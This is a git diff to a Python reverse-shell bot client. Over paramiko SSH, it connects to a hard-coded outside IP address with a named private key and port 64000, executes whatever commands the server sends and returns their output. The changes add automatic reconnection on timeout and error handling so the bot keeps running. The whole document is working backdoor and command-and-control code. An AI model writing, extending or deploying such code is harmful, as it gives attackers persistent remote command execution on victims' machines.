@@ -46,9 +46,6 @@ def signal_handler(sig, frame):
 signal.signal(signal.SIGINT, signal_handler)
 
 
-
-
-# This method receives an encoded command
 def exec_underlying_command(command):
     if isinstance(command, bytes):
         command = command.decode()
@@ -65,9 +62,21 @@ def exec_underlying_command(command):
 
     return result.strip('\n')
 
+command = "whoami".encode()
+user = exec_underlying_command(command)
+
+
+# Thread for counting 
+timeout = False
+def max_timeout(seconds=10):
+    global timeout
+    time.sleep(seconds)
+    timeout = True
+
+
 
 def ssh_rev_shell(ip, user, key_file, bot_user, port=22):
-    global ssh_client, ssh_session
+    global ssh_client, ssh_session, user
     ssh_client = paramiko.SSHClient()
 
     # Load host keys if available, or use AutoAddPolicy to add new ones
@@ -86,6 +95,7 @@ def ssh_rev_shell(ip, user, key_file, bot_user, port=22):
 
     #while server_instructions != "kill":
     if ssh_session.active:
+        timeout_thread =  threading.Thread(target=max_timeout, args=())
         print("[!] Sending identity!")
         ssh_session.send(bot_user.encode())
 
@@ -100,9 +110,24 @@ def ssh_rev_shell(ip, user, key_file, bot_user, port=22):
                 print("[!] Session terminated by the server!")
                 exit_gracefully()
 
+            if timeout == True:
+                ssh_session.close()
+                ssh_client.close()
+
+                # Make a recursive call
+                try:
+                    ssh_rev_shell('34.204.78.186', 'ubuntu', './archenemy_rsa', user, 64000)
+                except Exception as e:
+                    pass
+
+                return
+
             # Execute command on the channel and capture output
             print("Trying to execute the command")
-            response = exec_underlying_command(server_instructions)
+            try:
+                response = exec_underlying_command(server_instructions)
+            except Exception as e:
+                response = e
 
             ssh_session.send(response.encode())
 
@@ -118,9 +143,7 @@ def ssh_rev_shell(ip, user, key_file, bot_user, port=22):
 
 if __name__ == "__main__":
 
-    command = "whoami".encode()
-    user = exec_underlying_command(command)
-    #print(user)
+    global user
 
     # Try forever the commands
     while True:
